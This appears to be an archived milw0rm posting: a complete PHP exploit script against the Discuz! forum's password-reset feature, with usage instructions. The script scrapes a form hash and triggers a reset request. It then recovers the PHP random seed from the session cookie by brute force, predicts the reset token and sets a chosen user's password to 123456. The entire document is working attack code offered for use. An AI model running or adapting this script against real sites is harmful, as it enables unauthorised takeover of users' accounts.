<html><head><title>Discuz! Remote Reset User Password Exploit</title></head><pre>#!/usr/bin/php
&lt;?php

print_r('
+---------------------------------------------------------------------------+
Discuz! Reset User Password Exploit
by 80vul
team: http://www.80vul.com
+---------------------------------------------------------------------------+
');

if ($argc &lt; 6) {
print_r('
+---------------------------------------------------------------------------+
Usage: php '.$argv[0].' host path user mail uid
host: target server (ip/hostname)
path: path to discuz
user: user login name
mail: user login mail
uid: user login id
Example:
php '.$argv[0].' localhost /discuz/ 80vul 80vul@80vul.com 2
+---------------------------------------------------------------------------+
');
exit;
}

error_reporting(7);
ini_set('max_execution_time', 0);

$host = $argv[1];
$path = $argv[2];
$user = $argv[3];
$mail = $argv[4];
$uid = $argv[5];

$fp = fsockopen($host, 80);

$data = &quot;GET &quot;.$path.&quot;viewthread.php HTTP/1.1\r\n&quot;;
$data .= &quot;Host: $host\r\n&quot;;
$data .= &quot;Keep-Alive: 300\r\n&quot;;
$data .= &quot;Connection: keep-alive\r\n\r\n&quot;;

fputs($fp, $data);

$resp = '';

while ($fp &amp;&amp; !feof($fp)) {
$resp .= fread($fp, 1024);
preg_match('/&amp;amp;formhash=([a-z0-9]{8})/', $resp, $hash);
if ($hash)
break;
}

if ($hash) {
$cmd = 'action=lostpasswd&amp;username='.urlencode($user).'&amp;email='.urlencode($mail).'&amp;lostpwsubmit=true&amp;formhash='.$hash[1];
$data = &quot;POST &quot;.$path.&quot;member.php HTTP/1.1\r\n&quot;;
$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$data .= &quot;Referer: http://$host$path\r\n&quot;;
$data .= &quot;Host: $host\r\n&quot;;
$data .= &quot;Content-Length: &quot;.strlen($cmd).&quot;\r\n&quot;;
$data .= &quot;Connection: close\r\n\r\n&quot;;
$data .= $cmd;

fputs($fp, $data);

$resp = '';

while ($fp &amp;&amp; !feof($fp))
$resp .= fread($fp, 1024);

fclose($fp);

preg_match('/Set-Cookie:\s[a-zA-Z0-9]+_sid=([a-zA-Z0-9]{6});/', $resp, $sid);

if (!$sid)
exit(&quot;Exploit Failed!\n&quot;);

$seed = getseed();
if ($seed) {
mt_srand($seed);
random();
mt_rand();
$id = random();

$fp = fsockopen($host, 80);

$cmd = 'action=getpasswd&amp;uid='.$uid.'&amp;id='.$id.'&amp;newpasswd1=123456&amp;newpasswd2=123456&amp;getpwsubmit=true&amp;formhash='.$hash[1];
$data = &quot;POST &quot;.$path.&quot;member.php HTTP/1.1\r\n&quot;;
$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$data .= &quot;Referer: http://$host$path\r\n&quot;;
$data .= &quot;Host: $host\r\n&quot;;
$data .= &quot;Content-Length: &quot;.strlen($cmd).&quot;\r\n&quot;;
$data .= &quot;Connection: close\r\n\r\n&quot;;
$data .= $cmd;

fputs($fp, $data);

$resp = '';

while ($fp &amp;&amp; !feof($fp))
$resp .= fread($fp, 1024);

if (strpos($resp, '您的密码已重新设置，请使用新密码登录。') !== false)
exit(&quot;Expoilt Success!\nUser New Password:\t123456\n&quot;);
else
exit(&quot;Exploit Failed!\n&quot;);
} else
exit(&quot;Exploit Failed!\n&quot;);
} else
exit(&quot;Exploit Failed!\n&quot;);

function getseed()
{
global $sid;

for ($seed = 0; $seed &lt;= 1000000; $seed ++) {
mt_srand($seed);
$id = random(6);
if ($id == $sid[1])
return $seed;
}
return false;
}

function random($length = 6)
{
$hash = '';
$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
$max = strlen($chars) - 1;
for ($i = 0; $i &lt; $length; $i ++)
$hash .= $chars[mt_rand(0, $max)];

return $hash;
}

?&gt;

# milw0rm.com [2008-11-22]</pre></html>